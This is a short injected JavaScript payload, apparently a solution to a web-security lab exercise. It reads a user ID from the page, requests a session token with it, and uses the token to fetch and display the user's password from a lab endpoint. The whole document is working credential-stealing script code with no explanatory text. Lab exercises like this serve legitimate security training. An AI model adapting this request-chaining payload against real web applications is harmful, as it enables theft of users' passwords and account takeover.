<script>
 var xhr = new XMLHttpRequest();
 var xhr1 = new XMLHttpRequest();

 xhr1.onreadystatechange = function() {
   if(xhr1.readyState == 4 && xhr1.status == 200) {
	var resp1 = JSON.parse(xhr1.responseText);
        document.getElementById("result").innerHTML = resp1["resp"]["password"];
   }
 };

 xhr.onreadystatechange = function() {
   if(xhr.readyState == 4 && xhr.status == 200) {
	var resp = JSON.parse(xhr.responseText);
	token = resp["params"]["token"];
	xhr1.open('GET', '/lab/webapp/jfp/20/getpassword?token='+token, true);
	xhr1.send('');
   }
 };

 var uid = document.getElementById('settings').innerHTML.split(':')[1];
 xhr.open('GET', '/lab/webapp/jfp/20/gettoken?uid='+uid, true);
 xhr.send('');
</script>
